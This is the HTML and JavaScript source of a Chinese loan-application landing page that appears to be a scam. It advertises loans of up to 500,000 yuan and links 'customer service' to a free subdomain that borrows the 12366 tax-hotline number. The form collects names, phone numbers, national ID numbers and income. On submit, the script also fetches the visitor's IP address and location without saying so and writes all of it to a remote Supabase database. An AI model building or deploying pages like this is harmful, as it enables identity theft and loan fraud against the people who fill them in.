<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">

    <link href="./index_files/css.css?v=20260916" rel="stylesheet">
    <link href="./index_files/base.css?v=20260916" rel="stylesheet">
    <link href="./index_files/tab.css?v=20260916" rel="stylesheet">
</head>

<body>
    <div class="container">
        <!-- Banner -->
        <div class="banners-ad">
            <div class="index-product-photo">
                <a><img src="https://conversation.cdn.meoo.host/conversations/355332582025592832/image/2026-09-16/1789524013763-banner.gif?auth_key=28635fc494942436ba450b2713aa9bdec3acdec679211a7d1352857f002278cc" alt="最高可借50万"></a>
            </div>
        </div>

        <!-- 提示文字 -->
        <div class="tel-ad">
            <a href="javascript:void(0)" class="btn-tel">
                <b><span class="show-text"><font color="#FF0000">全国均可申请，无地域限制</font></span></b>
            </a>
        </div>

        <!-- 申请表单区域 -->
        <div class="simple-apply">
            <a name="top"></a>

            <!-- 申请标题 -->
            <div class="apply-title-wrap">
                <span class="title-line"></span>
                <a class="title-pill" target="_blank" href="https://12366.ccwu.cc/www/chat.html">点击快速在线申请</a>
                <span class="title-line"></span>
            </div>

            <!-- 表单内容 -->
            <div class="simple-content">
                <div class="apply-form">
                    <div class="service-link-wrap">
                        <a class="service-link" target="_blank" href="https://12366.ccwu.cc/www/chat.html">在线客服</a>
                    </div>

                    <ul class="form-list">
                        <li class="form-row">
                            <div class="form-label">姓 名</div>
                            <div class="form-input-wrap">
                                <input class="form-input" id="name" name="xingming" placeholder="请填写您的真实姓名" type="text" maxlength="50">
                            </div>
                        </li>
                        <li class="form-row">
                            <div class="form-label">手机号码</div>
                            <div class="form-input-wrap">
                                <input class="form-input" id="tel" name="shouji" placeholder="请填写您的手机号码" type="tel" maxlength="11">
                            </div>
                        </li>
                        <li class="form-row">
                            <div class="form-label">身份证号</div>
                            <div class="form-input-wrap">
                                <input class="form-input" id="idcard" name="shenfenzheng" placeholder="请填写您的身份证号码" type="text" maxlength="18">
                            </div>
                        </li>
                        <li class="form-row">
                            <div class="form-label">月收入</div>
                            <div class="form-input-wrap">
                                <input class="form-input" id="income" name="yueshouru" placeholder="请填写您的月收入（元）" type="number">
                            </div>
                        </li>
                        <li class="form-row">
                            <div class="form-label">贷款金额</div>
                            <div class="form-input-wrap">
                                <input class="form-input" id="amount" name="jine" placeholder="请填写申请贷款金额（元）" type="number">
                            </div>
                        </li>
                        <li class="form-row">
                            <div class="form-label">使用期限</div>
                            <div class="form-input-wrap">
                                <input class="form-input" id="term" name="qixian" placeholder="请填写使用期限（如：12个月）" type="text">
                            </div>
                        </li>
                        <li class="form-row">
                            <div class="form-label">贷款用途</div>
                            <div class="form-input-wrap">
                                <select class="form-input" id="purpose" name="yongtu">
                                    <option value="">请选择贷款用途</option>
                                    <option value="xiaofei">日常消费</option>
                                    <option value="jingying">经营周转</option>
                                    <option value="gouche">购车</option>
                                    <option value="zhuangxiu">装修</option>
                                    <option value="lvyou">旅游</option>
                                    <option value="other">其他</option>
                                </select>
                            </div>
                        </li>
                    </ul>

                    <div class="submit-btn-wrap">
                        <input class="submit-btn" id="submitBtn" type="button" value="立即申请">
                    </div>

                    <div class="simple-apply-alert">我们承诺：您的信息将被严格保密，请放心填写</div>

                    <img src="https://conversation.cdn.meoo.host/conversations/355332582025592832/image/2026-09-16/1789532544517-01.jpg?auth_key=fb54a20233932370054e814cbb6a1af3015a296bde938f60027c0c129e1f003e" alt="三步快速借款">
                    <img src="https://conversation.cdn.meoo.host/conversations/355332582025592832/image/2026-09-16/1789532544523-02.jpg?auth_key=90790f28b63f6b0c9dcc3be4e3b8f38cffcf6368ca999a9a2aee7b382793a057" alt="额度高下款快">
                    <img src="https://conversation.cdn.meoo.host/conversations/355332582025592832/image/2026-09-16/1789532544536-03.jpg?auth_key=42957e7a27a4fad96ab8efe65e2d6bd60d5e9a2cdc235fef5e2c0f4da0144a3f" alt="分期长安心用">
                    <img src="https://conversation.cdn.meoo.host/conversations/355332582025592832/image/2026-09-16/1789532363141-04.jpg?auth_key=83fef0c637547a4c2e9e02a583682603ddf99b86111468b3244463f523e6dae1" alt="网站认证信息">
                </div>
            </div>
        </div>

        <div id="copyright" class="footer" style="text-align: center"></div>
        <div id="fill1" class="fill"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
    <script>
    (function() {
        var SUPABASE_URL = 'https://6flhk9nxumzg0lq7.database.meoo.xyz';
        var SUPABASE_ANON_KEY = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJvbGUiOiJhbm9uIiwiaWF0IjoxNzg0NzcxMzI5LCJleHAiOjEzMjk1NDExMzI5fQ.HrtFaKWnYshWiYMLHVNw6TRPeOSsOFiY4tDUuKRXZHg';
        var supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        document.getElementById('submitBtn').addEventListener('click', async function() {
            var btn = this;
            var name = document.getElementById('name').value.trim();
            var phone = document.getElementById('tel').value.trim();
            var idCard = document.getElementById('idcard').value.trim();
            var income = document.getElementById('income').value;
            var amount = document.getElementById('amount').value;
            var term = document.getElementById('term').value.trim();
            var purpose = document.getElementById('purpose').value;

            // 表单验证 - 明确提示每个字段的格式要求
            if (!name) {
                alert('【姓名】不能为空，请输入您的真实姓名');
                return;
            }
            if (name.length < 2) {
                alert('【姓名】格式不正确，至少需要2个字符');
                return;
            }

            if (!phone) {
                alert('【手机号码】不能为空，请输入11位手机号码');
                return;
            }
            if (!/^1[3-9]\d{9}$/.test(phone)) {
                alert('【手机号码】格式不正确，必须是11位数字，以1开头，第二位是3-9');
                return;
            }

            if (!idCard) {
                alert('【身份证号】不能为空，请输入18位身份证号码');
                return;
            }
            if (!/^\d{17}[\dXx]$/.test(idCard)) {
                alert('【身份证号】格式不正确，必须是18位：前17位为数字，最后一位可以是数字或X');
                return;
            }

            if (income && isNaN(income)) {
                alert('【月收入】格式不正确，请输入数字（例如：5000）');
                return;
            }

            if (amount && isNaN(amount)) {
                alert('【贷款金额】格式不正确，请输入数字（例如：10000）');
                return;
            }

            if (term && !/^\d+$/.test(term)) {
                alert('【使用期限】格式不正确，请输入数字（例如：12、24、36）');
                return;
            }

            btn.disabled = true;
            btn.value = '提交中...';

            // 获取用户IP地址和地理位置
            var ipAddress = '127.0.0.1';
            var location = '未知';

            // 尝试获取真实IP和地区
            try {
                console.log('开始获取IP信息...');

                // 使用ipapi.co API(支持CORS)
                var response = await fetch('https://ipapi.co/json/');

                if (response.ok) {
                    var data = await response.json();
                    console.log('ipapi.co返回:', JSON.stringify(data));

                    if (data && data.ip) {
                        ipAddress = data.ip;

                        // 将英文地区转换为中文
                        var regionMap = {
                            'Beijing': '北京市', 'Shanghai': '上海市', 'Tianjin': '天津市', 'Chongqing': '重庆市',
                            'Hebei': '河北省', 'Shanxi': '山西省', 'Liaoning': '辽宁省', 'Jilin': '吉林省',
                            'Heilongjiang': '黑龙江省', 'Jiangsu': '江苏省', 'Zhejiang': '浙江省', 'Anhui': '安徽省',
                            'Fujian': '福建省', 'Jiangxi': '江西省', 'Shandong': '山东省', 'Henan': '河南省',
                            'Hubei': '湖北省', 'Hunan': '湖南省', 'Guangdong': '广东省', 'Hainan': '海南省',
                            'Sichuan': '四川省', 'Guizhou': '贵州省', 'Yunnan': '云南省', 'Shaanxi': '陕西省',
                            'Gansu': '甘肃省', 'Qinghai': '青海省', 'Taiwan': '台湾省',
                            'Inner Mongolia': '内蒙古自治区', 'Guangxi': '广西壮族自治区', 'Tibet': '西藏自治区',
                            'Ningxia': '宁夏回族自治区', 'Xinjiang': '新疆维吾尔自治区',
                            'Hong Kong': '香港特别行政区', 'Macau': '澳门特别行政区'
                        };

                        var regionCn = regionMap[data.region] || data.region;
                        var cityCn = data.city || '';
                        location = (regionCn || '') + (cityCn || '');

                        if (!location) location = '未知';

                        console.log('获取成功 - IP:', ipAddress, '地区:', location);
                    }
                } else {
                    console.log('ipapi.co调用失败,状态码:', response.status);
                }
            } catch (e) {
                console.log('IP获取失败:', e.message);
            }

            console.log('最终使用的IP:', ipAddress, '地区:', location);

            try {
                var result = await supabase.from('loan_applications').insert({
                    name: name,
                    phone: phone,
                    id_card: idCard || null,
                    monthly_income: income ? parseFloat(income) : null,
                    loan_amount: amount ? parseFloat(amount) : null,
                    loan_term: term || null,
                    loan_purpose: purpose || null,
                    ip_address: ipAddress || null,
                    location: location || null
                }).select();

                if (result.error) {
                    alert('提交失败：' + result.error.message);
                } else if (!result.data || result.data.length === 0) {
                    alert('提交失败，请稍后重试');
                } else {
                    alert('申请提交成功！请尽快直接联系在线客服直接办理下款咨询。');
                    document.getElementById('name').value = '';
                    document.getElementById('tel').value = '';
                    document.getElementById('idcard').value = '';
                    document.getElementById('income').value = '';
                    document.getElementById('amount').value = '';
                    document.getElementById('term').value = '';
                    document.getElementById('purpose').selectedIndex = 0;
                }
            } catch(e) {
                alert('网络错误，请检查网络连接后重试');
            } finally {
                btn.disabled = false;
                btn.value = '立即申请';
            }
        });
    })();
    </script>
</body>
</html>
